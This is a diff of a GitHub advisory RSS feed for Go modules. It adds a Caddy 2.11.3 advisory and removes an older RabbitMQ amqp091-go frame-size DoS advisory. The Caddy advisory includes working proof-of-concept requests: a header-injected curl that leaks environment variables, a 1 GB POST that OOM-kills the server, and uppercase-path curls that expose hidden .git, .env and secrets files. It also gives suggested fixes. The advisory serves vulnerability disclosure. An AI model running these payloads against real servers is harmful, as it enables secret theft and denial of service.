@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-09-18T12:27:10.702Z</updated>
+    <updated>2026-09-18T16:46:54.800Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,246 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/caddyserver/caddy/v2] Caddy: rewrite placeholder re-expansion, unbounded body buffer DoS, and fileHidden case-sensitivity bypass]]></title>
+        <id>https://github.com/advisories/GHSA-j8px-rmrx-76h9</id>
+        <link href="https://github.com/advisories/GHSA-j8px-rmrx-76h9"/>
+        <updated>2026-09-18T13:09:29.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="caddy-v2113--three-vulnerabilities-in-handlerplaceholder-layer">Caddy v2.11.3 — Three vulnerabilities in handler/placeholder layer</h1>
+<p><strong>Tested against:</strong> <code>caddy:2.11.3</code> (official Docker image, SHA verified at runtime)
+<strong>Reproduction environment:</strong> Docker Desktop 4.73.1 / Engine 29.4.3 on Windows 10 host, isolated containers, no network egress required for any of the exploits</p>
+<p>This advisory bundles three independent issues discovered together during a source review of the placeholder/replacer layer. Each issue has been reproduced end-to-end against the unmodified <code>caddy:2.11.3</code> image with the minimal Caddyfile that the documentation suggests for the affected feature.</p>
+<hr>
+<h2 id="issue-1-rewrite-handler--placeholder-double-expansion-enables-env-var--file-disclosure">Issue 1: Rewrite handler — placeholder double-expansion enables env var / file disclosure</h2>
+<p><strong>File:</strong> <code>modules/caddyhttp/rewrite/rewrite.go:215-249</code> and <code>buildQueryString</code> at <code>327</code>
+<strong>Class:</strong> CWE-94 (Code Injection), same bug class as CVE-2026-30852 (<code>vars_regexp</code>)
+<strong>Severity:</strong> Low (requires operator config with trailing <code>?</code> in rewrite URI)</p>
+<h3 id="root-cause">Root cause</h3>
+<p>When the operator's <code>rewrite</code> URI template:</p>
+<ol>
+<li>Contains a placeholder that resolves to request data (e.g. <code>{http.request.header.X-Foo}</code>), AND</li>
+<li>Ends with a literal <code>?</code> (with empty query side)</li>
+</ol>
+<p>…then the bytes produced by the <strong>first</strong> Replacer pass (which include attacker-controlled header values) are fed through <code>buildQueryString</code>, which runs a <strong>second</strong> Replacer pass and resolves any placeholders the attacker injected.</p>
+<pre><code class="language-go">// rewrite.go (abridged)
+newPath = repl.ReplaceAll(path, "")            // pass 1 — header expanded
+if before, after, found := strings.Cut(newPath, "?"); found {
+    var injectedQuery string
+    newPath, injectedQuery = before, after
+    if query == "" {                            // trailing-? branch
+        query = injectedQuery                   // attacker bytes flow into 'query'
+    }
+}
+if query != "" {
+    newQuery = buildQueryString(query, repl)    // pass 2 — RE-EXPANDS attacker input
+}
+</code></pre>
+<p>This is the same gadget that was patched in <code>vars_regexp</code> (CVE-2026-30852). The fix did not extend to <code>rewrite</code>, and there is no equivalent regression test for it in <code>rewrite_test.go</code> (compare <code>vars_test.go:63,69,75</code>).</p>
+<h3 id="reproduction-real-caddy-2113">Reproduction (real Caddy 2.11.3)</h3>
+<p><code>Caddyfile</code>:</p>
+<pre><code>{
+    admin off
+    auto_https off
+}
+
+:8080 {
+    rewrite * /serve/{http.request.header.X-Fwd}?
+    respond "PATH={path} QUERY={query}"
+}
+</code></pre>
+<p><code>docker-compose.yml</code>:</p>
+<pre><code class="language-yaml">services:
+  caddy:
+    image: caddy:2.11.3
+    environment:
+      DATABASE_URL: "postgres://leaked:supersecret@dbserver/production"
+    ports: ["8080:8080"]
+    volumes: ["./Caddyfile:/etc/caddy/Caddyfile:ro"]
+</code></pre>
+<p>Exploit:</p>
+<pre><code>$ docker compose up -d
+$ curl "http://localhost:8080/anything" -H "X-Fwd: foo?{env.DATABASE_URL}=leak"
+PATH=/serve/foo QUERY=postgres%3A%2F%2Fleaked%3Asupersecret%40dbserver%2Fproduction=leak
+</code></pre>
+<p>URL-decoded query: <code>postgres://leaked:supersecret@dbserver/production=leak</code>. The <code>DATABASE_URL</code> env var has been exfiltrated into the request URL, where it will appear in access logs, get forwarded to upstreams via <code>reverse_proxy</code>, and be readable via <code>{http.request.uri.query}</code> in any downstream handler.</p>
+<h3 id="available-read-primitives">Available read primitives</h3>
+<p>The same gadget exposes any placeholder the attacker can name in their injected substring:</p>
+<ul>
+<li><code>{env.X}</code> — any env var on the Caddy process</li>
+<li><code>{file./path}</code> — any file readable by the Caddy process (if <code>file</code> provider is registered)</li>
+<li><code>{vars.X}</code> — Caddy-internal request variables</li>
+</ul>
+<h3 id="suggested-fix-mirrors-the-cve-2026-30852-patch">Suggested fix (mirrors the CVE-2026-30852 patch)</h3>
+<p>After splitting at <code>?</code>, sanitize placeholder syntax in the injected query before passing it to <code>buildQueryString</code>:</p>
+<pre><code class="language-go">if before, after, found := strings.Cut(newPath, "?"); found {
+    var injectedQuery string
+    newPath, injectedQuery = before, after
+    if query == "" {
+        injectedQuery = strings.ReplaceAll(injectedQuery, "{", "%7B")
+        injectedQuery = strings.ReplaceAll(injectedQuery, "}", "%7D")
+        query = injectedQuery
+    }
+}
+</code></pre>
+<p>Also recommend adding equivalent regression tests in <code>rewrite_test.go</code> to the three "is not re-expanded" tests in <code>vars_test.go</code>.</p>
+<hr>
+<h2 id="issue-2-unbounded-body-buffer-via-httprequestbody-placeholder--memory-exhaustion-dos">Issue 2: Unbounded body buffer via <code>{http.request.body}</code> placeholder — memory exhaustion DoS</h2>
+<p><strong>File:</strong> <code>modules/caddyhttp/replacer.go:217-245</code> (placeholder resolution for <code>http.request.body</code>)
+<strong>Class:</strong> CWE-770 (Allocation of Resources Without Limits)
+<strong>Severity:</strong> Moderate (any operator using the documented <code>log_append body {http.request.body}</code> pattern is vulnerable)</p>
+<h3 id="root-cause-1">Root cause</h3>
+<p>When any handler references the <code>{http.request.body}</code> placeholder, the replacer code path reads the entire request body into a byte slice via <code>io.Copy(buf, req.Body)</code> with <strong>no <code>LimitReader</code></strong> wrapping. The <code>needsEarly</code> flag bypasses the <code>request_body</code> middleware's size limit, because the placeholder is resolved before that middleware sees the request.</p>
+<p>This means an attacker can send a request body of any size (up to whatever <code>Content-Length</code> they declare, or unlimited chunked) and Caddy will buffer all of it into RAM before any size check fires.</p>
+<h3 id="reproduction-real-caddy-2113-512-mb-container-cap">Reproduction (real Caddy 2.11.3, 512 MB container cap)</h3>
+<p><code>Caddyfile</code>:</p>
+<pre><code>{
+    admin off
+    auto_https off
+}
+
+:8080 {
+    log_append body {http.request.body}
+    respond "OK, length received: {http.request.header.Content-Length}"
+}
+</code></pre>
+<p><code>docker-compose.yml</code>:</p>
+<pre><code class="language-yaml">services:
+  caddy:
+    image: caddy:2.11.3
+    mem_limit: 512m
+    memswap_limit: 512m
+    ports: ["8080:8080"]
+    volumes: ["./Caddyfile:/etc/caddy/Caddyfile:ro"]
+</code></pre>
+<p>Exploit (Windows PowerShell):</p>
+<pre><code>PS&gt; fsutil file createnew big.bin 1073741824
+File C:\caddy-verify\test3-body-dos\big.bin is created
+PS&gt; curl.exe -X POST --data-binary "@big.bin" -H "Expect:" --max-time 120 http://localhost:8080/
+curl: (28) Operation timed out after 120010 milliseconds with 0 bytes received
+</code></pre>
+<p>Container state immediately after:</p>
+<pre><code>PS&gt; docker ps -a --filter name=caddy-verify-3
+CONTAINER ID   IMAGE         STATUS                       NAMES
+7f8ba392e7b5   caddy:2.11.3  Exited (137) 2 minutes ago   caddy-verify-3
+
+PS&gt; docker inspect caddy-verify-3 --format "ExitCode={{.State.ExitCode}} OOMKilled={{.State.OOMKilled}}"
+ExitCode=137 OOMKilled=true
+</code></pre>
+<p><code>OOMKilled=true</code> is dispositive — the Linux kernel's OOM killer fired. Caddy's logs cut off cleanly after <code>"serving initial configuration"</code> with no error message, which is the signature of a process killed mid-allocation by SIGKILL.</p>
+<p>A small body works fine:</p>
+<pre><code>$ curl -X POST -d "hello world" http://localhost:8080/
+OK, length received: 11
+</code></pre>
+<h3 id="real-world-exploitability">Real-world exploitability</h3>
+<p>The <code>log_append body {http.request.body}</code> pattern is in Caddy's documentation as a debugging aid for request troubleshooting and is widely used. Other affected configurations include CEL matchers like <code>expression {http.request.body}.contains('admin')</code>, custom header forwarding with <code>header_up X-Original-Body {http.request.body}</code>, and any third-party module that resolves the placeholder.</p>
+<p>Container memory limits in Docker / Kubernetes will result in OOM-kills as shown above; on bare-metal Caddy without cgroup limits, the attacker can exhaust all host RAM and trigger swap thrashing or system-wide instability.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Wrap the body read with a <code>LimitReader</code> keyed off either:</p>
+<ol>
+<li>The operator's configured <code>request_body.max_size</code> (if set), or</li>
+<li>A sane built-in default (proposal: 10 MB), with an opt-out / opt-up directive for operators who genuinely need to log large bodies.</li>
+</ol>
+<p>If the placeholder is referenced and the body exceeds the limit, the placeholder should resolve to a truncation marker or empty string, and a warning should be logged.</p>
+<hr>
+<h2 id="issue-3-filehidden-case-sensitive-pattern-bypass--exposes-hidden-files-via-case-variation">Issue 3: <code>fileHidden()</code> case-sensitive pattern bypass — exposes "hidden" files via case variation</h2>
+<p><strong>File:</strong> <code>modules/caddyhttp/fileserver/staticfiles.go:669-718</code> (the <code>fileHidden</code> function and <code>filepath.Match</code> call)
+<strong>Class:</strong> CWE-178 (Improper Handling of Case Sensitivity)
+<strong>Severity:</strong> Moderate (affects all macOS deployments, all Windows deployments, and any Linux deployment where mixed-case directories exist)</p>
+<h3 id="root-cause-2">Root cause</h3>
+<p><code>fileHidden()</code> uses <code>filepath.Match</code>, which is <strong>case-sensitive</strong>. However:</p>
+<ul>
+<li><strong>macOS APFS</strong> is case-insensitive by default</li>
+<li><strong>Windows NTFS</strong> is case-insensitive by default</li>
+<li><strong>Linux ext4</strong> can be configured with the <code>casefold</code> flag, and even without it, build pipelines / backup restores / typos can create same-name-different-case directories side by side</li>
+</ul>
+<p>On a case-insensitive filesystem, the OS resolves <code>/.git</code> and <code>/.GIT</code> to the same directory, but Caddy's hide check only fires on the exact-case literal <code>.git</code>. Result: the file is served via the uppercase URL.</p>
+<p>On a case-sensitive filesystem where both <code>.git</code> and <code>.GIT</code> exist as separate directories, Caddy hides only <code>.git</code> and exposes <code>.GIT</code>.</p>
+<h3 id="reproduction-real-caddy-2113-1">Reproduction (real Caddy 2.11.3)</h3>
+<p><code>Caddyfile</code>:</p>
+<pre><code>{
+    admin off
+    auto_https off
+}
+
+:8080 {
+    root * /srv
+    file_server {
+        hide .git .env secrets
+    }
+}
+</code></pre>
+<p>Setup: create six files inside the container (an Alpine setup container writes them so the case-distinct directories survive on the case-sensitive ext4 inside the Linux container):</p>
+<pre><code>/srv/.git/HEAD                "ref: refs/heads/main"
+/srv/.GIT/HEAD                "ref: refs/heads/main (UPPERCASE BYPASS)"
+/srv/.env                     "DATABASE_URL=postgres://user:pass@host"
+/srv/.ENV                     "DATABASE_URL=postgres://user:pass@host (UPPERCASE BYPASS)"
+/srv/secrets/api.txt          "supersecret_api_key=sk_live_real"
+/srv/SECRETS/api.txt          "supersecret_api_key=sk_live_real (UPPERCASE BYPASS)"
+</code></pre>
+<p>Test transcript (all three hide rules — <code>.git</code>, <code>.env</code>, <code>secrets</code> — bypassed via uppercase):</p>
+<pre><code>PS&gt; curl.exe -i http://localhost:8080/.git/HEAD
+HTTP/1.1 404 Not Found
+Content-Length: 0
+
+PS&gt; curl.exe -i http://localhost:8080/.GIT/HEAD
+HTTP/1.1 200 OK
+Content-Length: 40
+ref: refs/heads/main (UPPERCASE BYPASS)
+
+PS&gt; curl.exe -i http://localhost:8080/.env
+HTTP/1.1 404 Not Found
+Content-Length: 0
+
+PS&gt; curl.exe -i http://localhost:8080/.ENV
+HTTP/1.1 200 OK
+Content-Length: 58
+DATABASE_URL=postgres://user:pass@host (UPPERCASE BYPASS)
+
+PS&gt; curl.exe -i http://localhost:8080/secrets/api.txt
+HTTP/1.1 404 Not Found
+Content-Length: 0
+
+PS&gt; curl.exe -i http://localhost:8080/SECRETS/api.txt
+HTTP/1.1 200 OK
+Content-Length: 52
+Content-Type: text/plain; charset=utf-8
+supersecret_api_key=sk_live_real (UPPERCASE BYPASS)
+</code></pre>
+<p>Three separate hide rules, three separate uppercase bypasses, all 200 OK with the "hidden" content served.</p>
+<h3 id="why-this-matters-in-practice">Why this matters in practice</h3>
+<p><code>.git</code>, <code>.env</code>, and <code>secrets/</code> are three of the most common entries in production Caddy <code>hide</code> configurations because they correspond to high-value attacker targets:</p>
+<ul>
+<li><code>.git/HEAD</code> + <code>.git/config</code> + <code>.git/objects/</code> → source code disclosure</li>
+<li><code>.env</code> → credentials, API keys, database connection strings</li>
+<li><code>secrets/</code> → operator-named bucket of anything sensitive</li>
+</ul>
+<p>The bug means that on macOS and Windows hosts (and a subset of Linux hosts), the <code>hide</code> directive provides <strong>no protection at all</strong> for these files — only psychological protection. An attacker familiar with this bug will probe with case variants before assuming the files aren't there.</p>
+<h3 id="suggested-fix-1">Suggested fix</h3>
+<p>In <code>fileHidden()</code>, on platforms with case-insensitive filesystems (or when the configured filesystem is case-insensitive), perform the match against the lowercase request path and lowercase pattern. Go's standard library does not expose a portable "is this filesystem case-insensitive" check, so a reasonable conservative approach is to always lowercase both sides on <code>GOOS=darwin</code> and <code>GOOS=windows</code>, and to document for Linux operators that they should not rely on <code>hide</code> if their filesystem has <code>casefold</code> enabled or if they manage their files with case-folding tools.</p>
+<p>Alternative: enforce that paths matched by <code>hide</code> are also matched case-insensitively on all platforms, with an opt-out for operators who genuinely need case-sensitive matching.</p>
+<hr>
+<h2 id="reproduction-kit">Reproduction kit</h2>
+<p>A full reproduction kit (Caddyfiles, docker-compose.yml files, runnable PoCs) is available on request. All exploits in this report were verified against the unmodified official <code>caddy:2.11.3</code> Docker image.</p>
+<h2 id="reporter">Reporter</h2>
+<p>Independent security research. No prior coordination, no other parties notified, no public disclosure prior to this report. Happy to coordinate on disclosure timeline and credit.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/caddyserver/caddy/security/advisories/GHSA-j8px-rmrx-76h9">https://github.com/caddyserver/caddy/security/advisories/GHSA-j8px-rmrx-76h9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-77281">https://nvd.nist.gov/vuln/detail/CVE-2026-77281</a></li>
+<li><a href="https://github.com/caddyserver/caddy/pull/7761">https://github.com/caddyserver/caddy/pull/7761</a></li>
+<li><a href="https://github.com/caddyserver/caddy/commit/176b043b0104cee3f894023cd5a598ac29e404bb">https://github.com/caddyserver/caddy/commit/176b043b0104cee3f894023cd5a598ac29e404bb</a></li>
+<li><a href="https://github.com/caddyserver/caddy/releases/tag/v2.11.4">https://github.com/caddyserver/caddy/releases/tag/v2.11.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-j8px-rmrx-76h9">https://github.com/advisories/GHSA-j8px-rmrx-76h9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j8px-rmrx-76h9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-18T13:09:27.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/coredns/coredns] CoreDNS DoH/DoQ/gRPC bypass UPDATE rejection enforced on UDP/TCP]]></title>
         <id>https://github.com/advisories/GHSA-9gm5-9rfh-m6vx</id>
@@ -2015,57 +2255,5 @@ uri := fmt.Sprintf("amqps://user:pass@host/%s?certfile=%s&amp;keyfile=%s", vhost
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-09-17T17:03:55.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/rabbitmq/amqp091-go] RabbitMQ amqp091-go: Denial of Service via Sub-Spec Frame Size Negotiation]]></title>
-        <id>https://github.com/advisories/GHSA-xwwf-m8fg-p9q2</id>
-        <link href="https://github.com/advisories/GHSA-xwwf-m8fg-p9q2"/>
-        <updated>2026-09-17T17:03:52.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A Denial of Service (DoS) vulnerability exists in the AMQP client's connection negotiation logic. The AMQP specification explicitly mandates a strict minimum frame size of 4096 bytes to prevent pathological packet fragmentation. While the library defines a <code>frameMinSize = 4096</code> constant, the connection negotiation loop fails to enforce this boundary, blindly accepting whatever maximum frame size (<code>FrameMax</code>) the server advertises during the handshake.</p>
-<p>If a client connects to a malicious or compromised AMQP broker that advertises an extremely low <code>FrameMax</code> (such as 1 byte), the negotiation succeeds. Consequently, every subsequent message transmission is forced to splinter into thousands or millions of single-byte frames, causing massive CPU overhead, thread contention, and a near-instantaneous application freeze.</p>
-<hr>
-<h2 id="vulnerability-details">Vulnerability Details</h2>
-<h3 id="mechanism">Mechanism</h3>
-<p>During the connection establishment phase, the client and server negotiate connection parameters—including maximum channel count, heartbeat intervals, and maximum frame sizes. The vulnerability is located where the client accepts the server's tuning parameters:</p>
-<pre><code class="language-go">// Connection negotiation logic maps server values directly without validation
-if serverSettings.FrameMax &gt; 0 {
-    // VULNERABILITY: Lacks a floor validation check against frameMinSize (4096)
-    c.config.FrameMax = serverSettings.FrameMax 
-}
-</code></pre>
-<p>Because there is no conditional check asserting that <code>serverSettings.FrameMax &gt;= frameMinSize</code>, a value below the protocol specification floor is successfully registered. When the application later passes data payloads to the frame writer, the chunking algorithm splits the payload using the negotiated <code>FrameMax</code> value as its chunk window divisor.</p>
-<h3 id="impact">Impact</h3>
-<p>When <code>FrameMax</code> is set to an absurdly low threshold (e.g., 1 to 10 bytes):</p>
-<ul>
-<li>A standard 10 KiB message payload requires tens of thousands of individual write operations and frame headers.</li>
-<li>The system's CPU becomes entirely bound by frame serialization, memory allocation for frame structures, and context switching within the network output loops.</li>
-<li>This results in an application-layer Denial of Service (DoS) affecting not just the specific AMQP connection, but potentially the entire host system due to CPU resource starvation.</li>
-</ul>
-<hr>
-<h2 id="attack-vector">Attack Vector</h2>
-<p>An attacker who compromises an upstream AMQP broker, performs a Man-in-the-Middle (MitM) interception, or tricks an application into connecting to an unauthorized external rogue broker can trigger this vulnerability:</p>
-<ol>
-<li><strong>Rogue Handshake:</strong> The client application connects to an AMQP endpoint controlled by the attacker.</li>
-<li><strong>Malicious Parameter Tuning:</strong> During the <code>connection.tune</code> phase, the rogue server returns a <code>FrameMax</code> value of <code>1</code>.</li>
-<li><strong>Resource Exhaustion Trigger:</strong> The client completes the handshake successfully. As soon as the client attempts to publish a message or process traffic, the internal loop fragments the data into single-byte frames, spiking the host's CPU usage to 100% and disabling the application thread.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-xwwf-m8fg-p9q2">https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-xwwf-m8fg-p9q2</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-77403">https://nvd.nist.gov/vuln/detail/CVE-2026-77403</a></li>
-<li><a href="https://github.com/rabbitmq/amqp091-go/pull/353">https://github.com/rabbitmq/amqp091-go/pull/353</a></li>
-<li><a href="https://github.com/rabbitmq/amqp091-go/commit/2e0a919b89f337dbf58db2bb34ab206dac354a06">https://github.com/rabbitmq/amqp091-go/commit/2e0a919b89f337dbf58db2bb34ab206dac354a06</a></li>
-<li><a href="https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0">https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-xwwf-m8fg-p9q2">https://github.com/advisories/GHSA-xwwf-m8fg-p9q2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xwwf-m8fg-p9q2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-17T17:03:50.000Z</published>
     </entry>
 </feed>
